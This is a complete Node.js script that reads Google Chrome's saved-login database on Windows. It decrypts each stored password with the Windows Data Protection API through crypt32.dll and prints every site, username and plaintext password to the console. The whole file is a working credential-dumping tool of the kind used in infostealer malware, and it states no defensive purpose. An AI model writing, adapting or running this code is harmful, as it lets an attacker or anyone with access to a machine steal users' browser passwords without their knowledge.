"use strict";

var fs = require('fs');
var sqlite = require('sqlite3');
sqlite.verbose();
var ffi = require('ffi');
var ref = require('ref');
var struct = require('ref-struct');

var CHROME_LOGIN_DB_LOCATION = process.env['USERPROFILE'] + '/AppData/Local/Google/Chrome/User Data/Default/Login Data';
if (!fs.existsSync(CHROME_LOGIN_DB_LOCATION)) {
    console.log('Failed to load Chrome login database. Exiting.');
    process.exit(1);
}

var dpapi = loadCryptoApi();
var db = new sqlite.Database(CHROME_LOGIN_DB_LOCATION);
db.all('SELECT * FROM Logins', function(error, rows) {
    if (error) {
        console.log(error);
        return;
    }
    rows.filter(function (row) { return !row.blacklisted_by_user; }).forEach(function (row) {
        console.log({
            site: row.origin_url,
            user: row.username_value,
            pass: dpapi.decrypt(row.password_value, row.password_value.length)
        });
    });
});

function loadCryptoApi() {
    var CRYPT_INTEGER_BLOB = struct({
        'cbData': 'uint32',
        'pbData': 'pointer'
    });
    var pCRYPT_INTEGER_BLOB = ref.refType(CRYPT_INTEGER_BLOB);

    // Chrome stores passwords in windows using the "Data Protection API" which we can read from with CryptUnprotectData in crypt32.dll
    var crypt32 = ffi.Library('crypt32', {
        'CryptUnprotectData': ['bool', [pCRYPT_INTEGER_BLOB, 'pointer', pCRYPT_INTEGER_BLOB, 'pointer', 'pointer', 'uint32', pCRYPT_INTEGER_BLOB]]
    });

    function decrypt(pbPassword, length) {
        // create input crypto blob with length and password pointer
        var dataIn = new CRYPT_INTEGER_BLOB();
        dataIn.cbData = length >>> 0;
        dataIn.pbData = pbPassword;

        // create a place for crypt32 to output the result
        var dataOut = new CRYPT_INTEGER_BLOB();

        // attempt to decrypt using local user credentials
        var success = crypt32.CryptUnprotectData(dataIn.ref(), null, null, null, null, 0, dataOut.ref());

        if (success) {
            // read result into a buffer
            var outputData = ref.readPointer(dataOut.pbData.ref(), 0, dataOut.cbData);

            return outputData.toString();
        }
        return '';
    }

    return {
        decrypt: decrypt
    };
}
